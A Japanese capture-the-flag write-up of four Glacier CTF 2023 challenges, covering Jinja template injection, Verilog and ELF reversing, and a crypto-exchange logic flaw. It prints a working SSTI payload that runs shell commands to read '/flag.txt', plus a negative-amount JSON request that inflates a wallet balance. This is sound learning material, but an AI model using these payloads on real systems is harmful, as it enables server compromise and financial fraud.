---
title: "Glacier CTF 2023\nWriteup"
id: "glacier-2023-writeup"
description: "Glacier CTF 2023のWriteupです。"
author: "rikoteki"
createdAt: "2023-11-27"
isDraft: false
---

0nePaddingで参加してきました。

![image](https://github.com/r1k0t3k1/note/assets/57973603/7a1c61f3-2253-4992-a69f-53424eb6d410)

## [Intro Web] My First Website

問題文

![image](https://github.com/r1k0t3k1/note/assets/57973603/21b297c0-54c6-4fa7-97ef-84726939307c)

四則演算ができるサイトです。

![image](https://github.com/r1k0t3k1/note/assets/57973603/d0ca8763-8054-4a89-bd1c-7dd71d15bdd2)

`Calculate`押下時に発生するリクエストには`num1`,`num2`,`operator`のパラメータが存在しましたが、特に脆弱性は発見できませんでした。

問題文に戻り、`Don't forget to check out my other projects!`という指示から`here`のリンクを辿りますがNot Found ページのようでした。

ただし、レスポンスコードが`200`になっているのが気になります。

Discordを確認したところ意図した挙動とのことだったのでこのページを探索します。

![image](https://github.com/r1k0t3k1/note/assets/57973603/2bf3fc39-b22a-421e-8443-8266a01c52e6)

Not Foundページをよく見るとパスが出力されていることがわかります。

![image](https://github.com/r1k0t3k1/note/assets/57973603/6d7eb8bb-dba8-4264-abee-c6ce2720431c)

このパスに適当なPolyglotを挿入するとエラーを発生させることができました。

`<s>000'")}{{}}--//`

![image](https://github.com/r1k0t3k1/note/assets/57973603/903a58f5-16e8-4450-857b-c180bdecb251)

Polyglotを分解して挿入していったところ`{{`が原因だということがわかったのでSSTI経由のOSコマンド実行でフラグを取得します。

```
{{''.__class__.__mro__[1].__subclasses__()[351]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
```

![image](https://github.com/r1k0t3k1/note/assets/57973603/21a826bb-df45-42ad-9b99-19910239962a)

## [Intro Rev] Skilift

問題文

![image](https://github.com/r1k0t3k1/note/assets/57973603/0d3e8ae1-67a8-43bf-988a-ae3e97dec344)

`top.v`ファイルが与えられます。

```
module top(
    input [63:0] key,
    output lock
);

    reg [63:0] tmp1, tmp2, tmp3, tmp4;

    // Stage 1
    always @(*) begin
        tmp1 = key & 64'hF0F0F0F0F0F0F0F0;
    end

    // Stage 2
    always @(*) begin
        tmp2 = tmp1 <<< 5;
    end

    // Stage 3
    always @(*) begin
        tmp3 = tmp2 ^ "HACKERS!";
    end

    // Stage 4
    always @(*) begin
        tmp4 = tmp3 - 12345678;
    end

    // I have the feeling "lock" should be 1'b1
    assign lock = tmp4 == 64'h5443474D489DFDD3;

endmodule
```

よく知りませんが、Verilogだそうです。

入力を色々加工した結果が`0x5443474D489DFDD3`になれば良さそうなのでリバースします。

```python
from Crypto.Util.number import bytes_to_long

key = (((0x5443474D489DFDD3 + 12345678) ^ bytes_to_long(b"HACKERS!")) >> 5) & 0xF0F0F0F0F0F0F0F0
print(hex(key))
```

実行すると、下記のHexが得られます。

![image](https://github.com/r1k0t3k1/note/assets/57973603/78f05b50-5a17-44cc-95fa-9fd5027d67a9)

あとは上記の結果をncの接続先に入力すればフラグが表示されます。

![image](https://github.com/r1k0t3k1/note/assets/57973603/8ff0ff98-fa92-4646-bee2-43df53783ff3)

## [Rev] Password recovery

問題文

![image](https://github.com/r1k0t3k1/note/assets/57973603/f7285eda-97c9-4cce-9b7b-3484714aa032)

ELFバイナリが与えられます。

実行するとユーザー名、パスワードの入力を求められます。

![image](https://github.com/r1k0t3k1/note/assets/57973603/28933318-ce4d-4330-b273-12be0c67d676)

Ghidraで解析すると、入力したユーザー名を加工した結果と入力したパスワードの一致を`strcmp`で確認しているようです。

```c
undefined8 main(void)

{
  byte bVar1;
  int iVar2;
  ulong uVar3;
  size_t Username_Length;
  long in_FS_OFFSET;
  ulong Counter1;
  ulong Counter2;
  byte Username [64];
  char Password [56];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter your name: ");
  __isoc99_scanf(&DAT_00102016,Username);
  printf("Enter your password: ");
  __isoc99_scanf(&DAT_00102016,Password);
  Counter1 = 0;
  while( true ) {
    Username_Length = strlen((char *)Username);
    if (Username_Length <= Counter1) break;
    uVar3 = next_rand_value();
    Username_Length = strlen((char *)Username);
    bVar1 = Username[Counter1];
    Username[Counter1] = Username[uVar3 % Username_Length];
    Username[uVar3 % Username_Length] = bVar1;
    Counter1 = Counter1 + 1;
  }
  Counter2 = 0;
  while( true ) {
    Username_Length = strlen((char *)Username);
    if (Username_Length <= Counter2) break;
    Username[Counter2] = Username[Counter2] ^ *(byte *)((long)&key + (ulong)((uint)Counter2 & 7));
    Username[Counter2] = (char)Username[Counter2] % '\x1a';
    Username[Counter2] = Username[Counter2] + 0x61;
    Counter2 = Counter2 + 1;
  }
  iVar2 = strcmp((char *)Username,Password);
  if (iVar2 == 0) {
    puts("Valid!");
  }
  else {
    puts("Invalid!");
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

問題文でユーザー名は`LosCapitan`を与えられているので、このユーザー名を入力した際の`strcmp`をfridaでフックすればパスワードが取得できます。

`]^WR\\lcTI`

![image](https://github.com/r1k0t3k1/note/assets/57973603/1dd7924a-5d6a-45a1-b260-707a74602afb)

![image](https://github.com/r1k0t3k1/note/assets/57973603/6b4f304d-ca14-4743-abc8-fe8582f1312c)

あとは`gctf{}`でパスワードを囲めばフラグになります。

`gctf{]^WR\\lcTI}`

## [Web] Glacier Exchange

問題文

![image](https://github.com/r1k0t3k1/note/assets/57973603/f5e0a539-e73b-451f-bfb8-409382da2feb)

仮想通貨を取り扱うサイトのようです。

![image](https://github.com/r1k0t3k1/note/assets/57973603/ebf98580-3c1e-461f-8041-906d58175475)

以下、画面から確認できる機能です。

`Join GlacierClub`

現状は利用できません。もっとお金を払えば入れるようです。

![image](https://github.com/r1k0t3k1/note/assets/57973603/1ee522e0-d25c-437e-ade3-cdcc3eb1611b)

`Convert`

通貨を交換する機能です。

![image](https://github.com/r1k0t3k1/note/assets/57973603/0bfe8917-e4f9-466e-a3ca-abacd2bbe67b)

交換が成功するとBalanceに反映されます。

![image](https://github.com/r1k0t3k1/note/assets/57973603/1a57eebe-6f29-44b5-8476-17cbd08c1730)

続いてソースコードです。

フラグはGlacierClubに入ると取得できるようです。

```python
@app.route("/api/wallet/join_glacier_club", methods=["POST"])
def join_glacier_club():
    wallet = get_wallet_from_session()
    clubToken = False
    inClub = wallet.inGlacierClub()
    if inClub:
        f = open("/flag.txt")
        clubToken = f.read()
        f.close()
    return {
        "inClub": inClub,
        "clubToken": clubToken
    }
```

入会処理で、`wallet.InClacierClub`がTrueであれば入会できるようなので当該処理部分を確認します。

当該処理は`Wallet`クラスで実装されています。

cashoutが`1000000000`以上かつその他の通貨が`0.0`であればGlacierClubに入会できそうです。

```python
class Wallet():
    def __init__(self) -> None:
        self.balances = {
            "cashout": 1000,
            "glaciercoin": 0,
            "ascoin": 0,
            "doge": 0,
            "gamestock": 0,
            "ycmi": 0,
            "smtl": 0
        }
        self.lock = threading.Lock();


    def getBalances(self):
        return self.balances

    def transaction(self, source, dest, amount):
        if source in self.balances and dest in self.balances:
            with self.lock:
                if self.balances[source] >= amount:
                    self.balances[source] -= amount
                    self.balances[dest] += amount
                    return 1
        return 0

    def inGlacierClub(self):
        with self.lock:
            for balance_name in self.balances:
                if balance_name == "cashout":
                    if self.balances[balance_name] < 1000000000:
                        return False
                else:
                    if self.balances[balance_name] != 0.0:
                        return False
            return True
```

通貨金額が条件になっているので通貨を交換する`transaction`をあたってみます。

排他制御がされているためレースコンディションは無理そうですが、`amount`がマイナス値を受け入れています。

```python
    def transaction(self, source, dest, amount):
        if source in self.balances and dest in self.balances:
            with self.lock:
                if self.balances[source] >= amount:
                    self.balances[source] -= amount
                    self.balances[dest] += amount
                    return 1
        return 0
```

このため、以下のような通貨交換リクエストを送信すると、

```json
{
  "sourceCoin": "cashout",
  "targetCoin": "ascoin",
  "balance": -1000000000000000000000000000
}
```
特定の通貨を自由に増やすことができます。

```json
[
  {
    "name": "cashout",
    "value": 1E+27
  },
  {
    "name": "glaciercoin",
    "value": 0
  },
  {
    "name": "ascoin",
    "value": -1E+27
  },
  {
    "name": "doge",
    "value": 0
  },
  {
    "name": "gamestock",
    "value": 0
  },
  {
    "name": "ycmi",
    "value": 0
  },
  {
    "name": "smtl",
    "value": 0
  }
]

```


また、大きい金額をリクエストすると、金額が`Infinity`となることを確認しました。

![image](https://github.com/r1k0t3k1/note/assets/57973603/d3b9a75d-8961-49c6-a565-a46b6004036d)

`wallet.transaction`が呼び出される際の金額にあたる引数がfloatにキャストされているため、float型の最大値を超えた場合に`Infinity`となるようです。

```python
@app.route('/api/wallet/transaction', methods=['POST'])
def transaction():
    payload = request.json
    status = 0
    if "sourceCoin" in payload and "targetCoin" in payload and "balance" in payload:
        wallet = get_wallet_from_session()
        status = wallet.transaction(payload["sourceCoin"], payload["targetCoin"], float(payload["balance"]))
    return jsonify({
        "result": status
    })
```

これらの脆弱性を利用して以下の手順でGlacierClubへの入会条件が満たせそうです。   

1. マイナス値チェックの不備を利用して`cashout`を`Infinity`となる手前の金額まで増やす

(処理系が異なる場合もありますが、Floatの最大値は以下で確認できます)

![image](https://github.com/r1k0t3k1/note/assets/57973603/532f6253-8c63-480f-ac86-74d5ae665d0f)

![image](https://github.com/r1k0t3k1/note/assets/57973603/bab274fd-8602-4bed-bf6e-d976e05fde1f)

![image](https://github.com/r1k0t3k1/note/assets/57973603/30f76f69-2528-40a6-bbfe-0fe5d0abe6dd)


２. 1で利用した通貨とは別の通貨で`cashout`を`Infinity`にする

![image](https://github.com/r1k0t3k1/note/assets/57973603/8d11626a-ad85-4717-b3c1-aa567a787b7b)

![image](https://github.com/r1k0t3k1/note/assets/57973603/7c254e54-a5bf-4aa1-a65a-b9d1f3d915bd)

3. `cashout`からマイナス通貨を補填し0にする

![image](https://github.com/r1k0t3k1/note/assets/57973603/b8b9ec6a-a277-443c-9847-64d001395119)

![image](https://github.com/r1k0t3k1/note/assets/57973603/e625dc9b-1435-4caa-831f-589a0afc9a88)

![image](https://github.com/r1k0t3k1/note/assets/57973603/93271f8c-df2e-402d-b1f0-eb2324e974da)

![image](https://github.com/r1k0t3k1/note/assets/57973603/a395ec76-ff94-4098-a16d-100abd727a00)

この状態で`Join GlacierClub`をリクエストを送信すればフラグが取得できます。

![image](https://github.com/r1k0t3k1/note/assets/57973603/665606df-4025-468d-98bf-07af4866f503)

